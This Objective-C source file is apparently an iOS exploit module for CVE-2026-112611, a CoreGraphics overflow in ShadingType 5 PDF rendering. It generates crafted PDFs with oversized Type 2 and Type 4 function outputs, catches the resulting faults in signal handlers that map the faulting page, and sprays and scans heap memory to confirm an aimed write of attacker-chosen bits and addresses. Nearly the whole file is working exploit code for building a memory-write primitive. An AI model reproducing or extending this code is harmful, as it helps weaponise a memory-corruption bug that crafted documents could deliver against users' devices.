// ---------------------------------------------------------------------------
// CVE-2026-112611 - in-process aimed WRITE, ported from the public recipe
// (natsuk1 / Rust505 / SKVLENT "entry_v545_mmap_force.c" + marksvia's measured
// store semantics).  No daemon, no entitlement, no device-side kludges:
//
//  1. a ShadingType 5 PDF whose Type 2 /Function returns FARMORE components
//     (/C0 holds NOUT=2816 copies of one literal) than the record buffer has,
//     overflows the per-vertex record during rendering;
//  2. the literal is "%.17g" of the DOUBLE whose IEEE-754 BITS are the value we
//     want in memory - the store writes exactly those 8 bytes;
//  3. on the SIGSEGV/SIGBUS the handler mach_vm_allocate()s the faulting page
//     VM_FLAGS_FIXED, fills it 0xCC, and RETURNS - the store re-executes INTO
//     our page, so the write lands in memory we own;
//  4. scan the page for the expected bits: a hit is a MEASURED, AIMED write.
//
// Parameters that are per-build (the fault signature, whether the store is the
// iOS str-wzr 4-byte zero or the 16-byte record copy) are measured here, not
// assumed: the first fault is logged with far/esr/pc before any mapping.
// ---------------------------------------------------------------------------
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import <dlfcn.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <stdint.h>
#import <errno.h>
#import <signal.h>
#import <setjmp.h>
#import <sys/mman.h>
#import <mach/mach.h>
#import <pthread.h>
// the iOS SDK does not export mach_vm_allocate through mach.h (the public
// V545 recipe declares it extern too)
extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
                                      mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                        mach_vm_size_t size);
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

#define VPR 64
#define ROWS 2
#define NOUT 2816        // marksvia: "not tunable without changing the frame"

static void build_vertices(unsigned char *vs, size_t cap) {
    size_t vn = 0; unsigned acc = 0; int nb = 0;
    for (int i = 0; i < VPR * ROWS; i++) {
        unsigned vals[3] = { (unsigned)(0x1000 + (i % VPR) * 10),
                             (unsigned)(0x1000 + (i / VPR) * 10), 0u };
        int widths[3] = { 32, 32, 8 };
        for (int k = 0; k < 3; k++)
            for (int b = widths[k] - 1; b >= 0; b--) {
                acc = (acc << 1) | ((vals[k] >> b) & 1u);
                if (++nb == 8) {
                    if (vn < cap) vs[vn++] = (unsigned char)(acc & 0xFF);
                    acc = 0; nb = 0;
                }
            }
    }
    if (nb && vn < cap) vs[vn++] = (unsigned char)((acc << (8 - nb)) & 0xFF);
}

static int write_pdf(const char *path, uint64_t bits, int nout) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    unsigned char vs[2048];
    build_vertices(vs, sizeof vs);
    long off[8] = {0};

    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
    off[1] = ftell(f);
    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
    off[2] = ftell(f);
    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
    off[3] = ftell(f);
    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
    off[4] = ftell(f);
    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
    size_t last = 0;
    for (size_t i = 0; i < sizeof vs; i++) if (vs[i]) last = i;
    size_t vn = last + 1;
    off[5] = ftell(f);
    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", VPR, vn);
    fwrite(vs, 1, vn, f);
    fprintf(f, "\nendstream\nendobj\n");
    off[6] = ftell(f);
    double d; memcpy(&d, &bits, 8);
    fprintf(f, "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [");
    for (int i = 0; i < nout; i++) fprintf(f, "%s%.17g", i ? " " : "", d);
    fprintf(f, "] /C1 [");
    for (int i = 0; i < nout; i++) fprintf(f, "%s1.0", i ? " " : "");
    fprintf(f, "] >>\nendobj\n");
    long xref = ftell(f);
    // a REAL xref table: the previous build's PDF had none, and a parser that
    // recovers silently may have skipped the shading entirely (no fault seen)
    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
    for (int i = 1; i <= 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
    fclose(f);
    return 0;
}

// renders and answers "did it paint?": the count of non-white pixels in the
// 64x64 bitmap.  A shading that is skipped by the parser paints nothing, so
// this separates "no fault because nothing rendered" from "no fault because
// the overflow lands silently".
static int render_pdf(const char *path) {
    CFURLRef u = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,
               (const UInt8 *)path, (CFIndex)strlen(path), false);
    if (!u) return -1;
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithURL(u);
    CFRelease(u);
    if (!doc) return -2;
    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    if (!page) { CGPDFDocumentRelease(doc); return -3; }
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 0, cs,
                                             (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) { CGPDFDocumentRelease(doc); return -4; }
    CGContextDrawPDFPage(ctx, page);
    int painted = 0;
    uint8_t *px = CGBitmapContextGetData(ctx);
    if (px) {
        for (int i = 0; i < 64 * 64; i++) {
            uint8_t r = px[i * 4], g = px[i * 4 + 1], b = px[i * 4 + 2];
            if (r < 250 || g < 250 || b < 250) painted++;
        }
    }
    CGContextRelease(ctx);
    CGPDFDocumentRelease(doc);
    return painted;
}

// ---- the in-handler map (V545 recipe) -------------------------------------
static sigjmp_buf          g_jb;
static volatile sig_atomic_t g_in_h = 0;
static volatile sig_atomic_t g_in_probe = 0;
static volatile pthread_t   g_tid;
static volatile uintptr_t   g_far = 0, g_pc = 0, g_esr = 0;
static volatile int         g_sig = 0;
static volatile int         g_mapped = 0;
static volatile uintptr_t   g_page = 0;
#define NPAGES 16
#define PAGESZ 0x4000ULL

static void force_handler(int sig, siginfo_t *si, void *uc) {
    if (g_in_h) { signal(sig, SIG_DFL); return; }
    if (!g_in_probe || !pthread_equal(pthread_self(), (pthread_t)g_tid)) { signal(sig, SIG_DFL); return; }
    g_in_h = 1;
    uintptr_t far = (uintptr_t)si->si_addr;
    ucontext_t *u = (ucontext_t *)uc;
    g_far = far; g_sig = sig;
    if (u) { g_esr = u->uc_mcontext->__es.__esr; g_pc = u->uc_mcontext->__ss.__pc; }
    AvePost([NSString stringWithFormat:@"112611 FAULT sig=%d far=%#llx pc=%#llx esr=%#08llx WnR=%d",
             sig, (unsigned long long)far, (unsigned long long)g_pc,
             (unsigned long long)g_esr, (int)((g_esr >> 6) & 1)]);
    // map the faulting page and let the store retry into OUR memory
    mach_vm_address_t p = (mach_vm_address_t)(far & ~(PAGESZ - 1));
    int ok = 0;
    for (int i = 0; i < NPAGES; i++) {
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &p, PAGESZ, VM_FLAGS_FIXED);
        if (kr == KERN_SUCCESS) { memset((void *)(uintptr_t)p, 0xCC, PAGESZ); ok++; }
        p += PAGESZ;
    }
    if (ok > 0) {
        g_page = (uintptr_t)(far & ~(PAGESZ - 1));
        g_mapped = 1;
        AvePost([NSString stringWithFormat:@"112611 mapped %d/%d pages at %#llx - the store retries into OUR memory",
                 ok, NPAGES, (unsigned long long)g_page]);
        g_in_h = 0;
        return;                      // retry the store
    }
    g_in_h = 0;
    siglongjmp(g_jb, 1);
}

// ---- the silent-write carpet -------------------------------------------------
// 11 lengths rendered with NO fault at all (measured 19 Nov), which is marksvia's
// "no HIT but the process survived" branch: the overflow writes into mapped heap
// memory.  A marked carpet is how that becomes visible - the same method that
// proved the 86950 primitive.  The write VALUE is our aim bits, so a changed
// word is both proof and a read of the primitive's content.
#define NCAR 24
static const size_t CAR_SZ[] = { 4096, 8192, 16384, 22528, 32768 };  // 22528 = NOUT*8
#define NCARS (int)(sizeof CAR_SZ / sizeof CAR_SZ[0])

static void carpet_fill(void *p, size_t n, int d) {
    uint16_t *m = (uint16_t *)p;
    size_t n16 = n / 2;
    for (size_t j = 0; j < n16; j++) {
        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
        if (d >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xD000 + d);
        m[j] = v;
    }
}

// Type 4 (PostScript calculator) function - marksvia's step 3/4: a pointer-sized
// integer is a DENORMAL double, and the PDF decimal parser zeroes a denormal
// literal, so Type 2 /C0 cannot carry a real address.  The calculator builds it
// by integer arithmetic instead: <m> 2 -1074 exp mul -> the double whose BITS
// are exactly m, and the value is duplicated to NOUT outputs.
static int write_pdf4(const char *path, uint64_t mantissa, int nout) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    unsigned char vs[2048];
    build_vertices(vs, sizeof vs);
    long off[8] = {0};

    fprintf(f, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
    off[1] = ftell(f);
    fprintf(f, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
    off[2] = ftell(f);
    fprintf(f, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
    off[3] = ftell(f);
    fprintf(f, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
               "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
    off[4] = ftell(f);
    fprintf(f, "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
    size_t last = 0;
    for (size_t i = 0; i < sizeof vs; i++) if (vs[i]) last = i;
    size_t vn = last + 1;
    off[5] = ftell(f);
    fprintf(f, "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
               "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
               "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %zu >>\nstream\n", VPR, vn);
    fwrite(vs, 1, vn, f);
    fprintf(f, "\nendstream\nendobj\n");
    off[6] = ftell(f);
    size_t cap = (size_t)nout * 8 + 512;
    char *body = malloc(cap);
    if (!body) { fclose(f); return -1; }
    size_t n = 0;
    n += (size_t)snprintf(body + n, cap - n, "{ pop %llu 2 -1074 exp mul",
                          (unsigned long long)mantissa);
    for (int i = 1; i < nout; i++)
        n += (size_t)snprintf(body + n, cap - n, " dup");
    n += (size_t)snprintf(body + n, cap - n, " }");
    fprintf(f, "6 0 obj\n<< /FunctionType 4 /Domain [0 1] /Range [");
    for (int i = 0; i < nout; i++) fprintf(f, "%s0 1", i ? " " : "");
    fprintf(f, "] /Length %zu >>\nstream\n%s\nendstream\nendobj\n", n, body);
    free(body);
    long xref = ftell(f);
    fprintf(f, "xref\n0 7\n0000000000 65535 f \n");
    for (int i = 1; i <= 6; i++) fprintf(f, "%010ld 00000 n \n", off[i]);
    fprintf(f, "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n", xref);
    fclose(f);
    return 0;
}

NSString *ModShading5Force(void) {
    AvePost(@"112611 start: mmap-force aimed write (public V545 recipe)");

    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = force_handler;
    sa.sa_flags = SA_SIGINFO | SA_ONSTACK | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    static char alt[256 * 1024];
    stack_t ss; ss.ss_sp = alt; ss.ss_size = sizeof alt; ss.ss_flags = 0;
    sigaltstack(&ss, NULL);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGTRAP, &sa, NULL);

    // the write value: a recognisable double bit pattern whose BITS are exactly it
    uint64_t bits = 0x41424344454647C0ULL;
    double d; memcpy(&d, &bits, 8);
    AvePost([NSString stringWithFormat:@"112611 aim value bits=%#llx (%.17g)", bits, d]);

    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *dir = dirs.firstObject ?: NSTemporaryDirectory();
    NSString *pdfPath = [dir stringByAppendingPathComponent:@"f112611.pdf"];
    const char *path = pdfPath.fileSystemRepresentation;

    // Step 1 = marksvia's C0 sweep: the overflow distance is set by the /C0
    // length, and their 2816 is a measurement on THEIR build - ours has a
    // different frame, so the length that reaches the store is unknown.  Each
    // candidate gets its own guarded window; a fault reports WnR/far, and the
    // handler maps the faulting page so the store retries into our memory.
    int cands[] = { 64, 128, 256, 512, 1024, 1536, 2048, 2816, 3072, 4096, 6029 };
    int nc = (int)(sizeof cands / sizeof cands[0]);
    NSString *verdict = nil;

    g_tid = (volatile pthread_t)pthread_self();

    // control: the bundle's known-good type-5 shading must paint; if it does
    // and ours does not, our generated PDF is rejected by the parser before
    // the render ever happens
    NSString *ctl = [NSString stringWithFormat:@"%@/control_shading_type5.pdf",
                     [NSBundle mainBundle].bundlePath];
    int ctlPainted = render_pdf(ctl.fileSystemRepresentation);
    AvePost([NSString stringWithFormat:@"112611 control render: %d/4096 painted (rc=%d)",
             ctlPainted > 0 ? ctlPainted : 0, ctlPainted]);

    static void *car_ptrs[NCAR * NCARS];
    static size_t car_sz[NCAR * NCARS];
    static int car_id[NCAR * NCARS];

    for (int ci = 0; ci < nc && !verdict; ci++) {
        int nout = cands[ci];
        AvePost([NSString stringWithFormat:@"112611 probe C0=%d", nout]);
        if (write_pdf(path, bits, nout) != 0) {
            AvePost([NSString stringWithFormat:@"112611: cannot write the probe PDF (errno=%d)", errno]);
            return @"112611: PDF generation failed";
        }
        // carpet BEFORE the render: if the overflow writes silently into mapped
        // heap (measured: no fault at any length), it lands in marked memory.
        int cn = 0;
        for (int si = 0; si < NCARS; si++) {
            for (int r = 0; r < NCAR; r++) {
                void *p = malloc(CAR_SZ[si]);
                if (!p) continue;
                int id = (CAR_SZ[si] == 4096) ? r : -1;
                carpet_fill(p, CAR_SZ[si], id);
                car_ptrs[cn] = p; car_sz[cn] = CAR_SZ[si]; car_id[cn] = id; cn++;
            }
        }
        AvePost([NSString stringWithFormat:@"112611 C0=%d carpet: %d marked blocks", nout, cn]);

        g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
        if (sigsetjmp(g_jb, 1) == 0) {
            int painted = render_pdf(path);
            g_in_probe = 0;
            AvePost([NSString stringWithFormat:@"112611 C0=%d painted %d/4096", nout, painted]);
        } else {
            g_in_probe = 0;
            AvePost([NSString stringWithFormat:@"112611 C0=%d: fault left the store unmapped", nout]);
        }

        int corrupt = 0, printed = 0;
        for (int i = 0; i < cn; i++) {
            uint16_t *m = (uint16_t *)car_ptrs[i];
            size_t n16 = car_sz[i] / 2;
            for (size_t j = 0; j < n16; j++) {
                uint16_t want = (uint16_t)(0x0100 + (j & 0xFF));
                if (car_id[i] >= 0 && (j == 1024 || j == 1025)) want = (uint16_t)(0xD000 + car_id[i]);
                if (m[j] != want) {
                    corrupt++;
                    if (printed < 12) {
                        printed++;
                        uint64_t got32 = ((uint64_t)m[j+1] << 16) | m[j];
                        AvePost([NSString stringWithFormat:@"112611 CORRUPTION C0=%d block %d "
                                 @"(+%zu) u16@+%#zx = %#06x want %#06x (pair %#018llx)",
                                 nout, i, car_sz[i], j * 2, m[j], want, got32]);
                    }
                }
            }
        }
        AvePost([NSString stringWithFormat:@"112611 C0=%d carpet scan: %d changed u16", nout, corrupt]);
        if (corrupt) {
            verdict = [NSString stringWithFormat:@"112611: SILENT WRITE CONFIRMED (C0=%d): %d u16 "
                       @"changed in %d marked blocks - the overflow writes into mapped heap",
                       nout, corrupt, cn];
            AvePost(verdict);
        }

        if (g_mapped && g_page) {
            int exact = 0, other = 0; size_t first_off = 0;
            uint64_t *w = (uint64_t *)g_page;
            for (size_t k = 0; k < (NPAGES * PAGESZ) / 8; k++) {
                uint64_t v = w[k];
                if (v == 0xCCCCCCCCCCCCCCCCULL) continue;
                if (v == bits) { if (!exact) first_off = k * 8; exact++; }
                else other++;
            }
            AvePost([NSString stringWithFormat:@"112611 C0=%d scan: %d words == aim bits, %d other "
                     @"changed, first at +%#zx", nout, exact, other, first_off]);
            if (exact) {
                AvePost(@"112611 verdict: AIMED WRITE CONFIRMED in mapped memory (our value, our page)");
                verdict = @"112611: AIMED WRITE CONFIRMED (our bits landed in our page)";
            } else if (other) {
                verdict = [NSString stringWithFormat:@"112611 C0=%d: the store landed but not our bits "
                           @"(%d other words changed)", nout, other];
            }
        }
    }

    // ---- the ADDRESS route: Type-4 calculator carries a real address ------------
    // measured: the Type-2 probes all paint (4096/4096) and never fault, and the
    // Type-2 literal cannot be pointer-sized (the decimal parser zeroes a
    // denormal).  So the address must arrive through the calculator: a page we
    // own is mmap'ed, its address goes into the Type-4 literal, and the
    // mmap-force handler covers a wrong offset calibration (unmapped -> map ->
    // the store retries into memory ours).
    if (!verdict) {
        uint8_t *aim = mmap(NULL, PAGESZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (aim == MAP_FAILED) {
            AvePost(@"112611: cannot mmap the aim page");
        } else {
            memset(aim, 0xCC, PAGESZ);
            uint64_t aimv = (uint64_t)(uintptr_t)aim;
            AvePost([NSString stringWithFormat:@"112611 aim page at %#llx, Type-4 literal carries it",
                     (unsigned long long)aimv]);
            long deltas[] = { 0, -0x76c, -0x1000, 0x1000, 0x4000 };
            int nd = (int)(sizeof deltas / sizeof deltas[0]);
            int aimC0[] = { 2816, 1024, 256 };
            int na = (int)(sizeof aimC0 / sizeof aimC0[0]);
            for (int di = 0; di < nd && !verdict; di++) {
                for (int ai = 0; ai < na && !verdict; ai++) {
                    uint64_t value = aimv + deltas[di];
                    int nout = aimC0[ai];
                    if (write_pdf4(path, value, nout) != 0) continue;
                    memset(aim, 0xCC, PAGESZ);
                    AvePost([NSString stringWithFormat:@"112611 aim: C0=%d value=%#llx (page%+ld)",
                             nout, (unsigned long long)value, deltas[di]]);
                    g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
                    if (sigsetjmp(g_jb, 1) == 0) {
                        int painted = render_pdf(path);
                        g_in_probe = 0;
                        AvePost([NSString stringWithFormat:@"112611 aim painted %d/4096", painted]);
                    } else {
                        g_in_probe = 0;
                        AvePost(@"112611 aim: second fault, unmapped");
                    }
                    // scan the aim page and any mapped page for OUR value
                    int hits = 0;
                    for (size_t k = 0; k < PAGESZ / 8; k++) {
                        if (((uint64_t *)aim)[k] == value) hits++;
                    }
                    if (g_mapped && g_page) {
                        uint64_t *w = (uint64_t *)g_page;
                        for (size_t k = 0; k < (NPAGES * PAGESZ) / 8; k++)
                            if (w[k] == value) hits++;
                    }
                    AvePost([NSString stringWithFormat:@"112611 aim scan: %d words == %#llx", hits,
                             (unsigned long long)value]);
                    if (hits) {
                        AvePost(@"112611 verdict: AIMED WRITE CONFIRMED (our address, our page, our value)");
                        verdict = @"112611: AIMED WRITE CONFIRMED (Type-4 address route)";
                    }
                }
            }
            munmap(aim, PAGESZ);
        }
    }

    if (!verdict) {
        AvePost([NSString stringWithFormat:@"112611 verdict: no fault across C0=%d..%d and no aimed hit "
                 @"- the overflow either does not write or writes outside our pages on this build",
                 cands[0], cands[nc-1]]);
        verdict = @"112611: no write observed (all routes)";
    }
    return verdict;
}